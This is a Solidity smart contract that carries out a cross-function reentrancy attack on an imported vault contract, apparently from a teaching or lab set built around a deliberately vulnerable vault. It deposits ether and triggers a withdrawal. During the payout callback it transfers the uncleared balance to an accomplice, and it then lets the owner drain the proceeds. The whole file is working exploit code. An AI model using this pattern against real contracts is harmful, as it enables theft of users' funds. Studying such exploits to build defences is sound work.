//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {CrossFunctionReentrancyVault} from "./CrossFunctionReentrancyVault.sol";

contract CrossFunctionAttack {
    CrossFunctionReentrancyVault public vault;
    address public accomplice;
    address public owner;

    bool private _attacking;

    constructor(address payable _vault, address _accomplice) {
        vault = CrossFunctionReentrancyVault(_vault);
        accomplice = _accomplice;
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value == 1 ether, "Send some ether to attack");
        vault.deposit{value: msg.value}();
        _attacking = true;
        vault.withdraw();
        _attacking = false;
    }

    receive() external payable {
        if(!_attacking) {
            return;
        }
        // _attacking = false;
        vault.transfer(accomplice, msg.value);
    }

    function withdrawProfit() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
}